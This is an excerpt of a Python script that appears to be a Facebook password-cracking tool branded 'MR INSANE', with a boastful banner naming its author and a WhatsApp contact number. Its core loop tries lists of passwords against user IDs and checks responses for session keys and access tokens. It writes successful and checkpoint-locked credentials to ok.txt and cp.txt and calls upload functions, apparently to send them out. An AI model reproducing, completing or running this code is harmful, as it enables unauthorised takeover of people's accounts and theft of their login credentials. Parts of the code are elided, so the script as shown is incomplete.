...
def notice():
	...
	runtxt("\033[0;92m ADMIN🧞‍♀️ WATSAPPP🤲 wa.me/+923086271330")
...
┌───────────────────────────────────────┐
\033[1;33m│ [✓] AUTHOR  
    Anonymous X 07\033[1;32m[INSANE]         │
\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37m |MAI NI BTAON GA\x1b[0m           │
\033[1;35m│ [✓] WHATSAPP :  923086271330           │
\033[1;36m│ [✓] MR INSANE : \x1b[1;32mYOUR FATHER\x1b[1;97m           │
\033[1;32m└───────────────────────────────────────┘  
         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 [INSANE] [FATHER]\x1b[0m    
 """)
		print("%s [%s•%s] %sTOOL NAME : %sMR INSANE❌ PROO DECODER❌"%(G,R,G,B,G))
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [INSANE] : %s/%s -> \033[0;92m [ INSANE-OK:%s ]- \033[0;91m[INSANE-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAA" in response.text:
				...
				open("ok.txt","a").write(" [INSANE-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[INSANE-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [INSANE-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
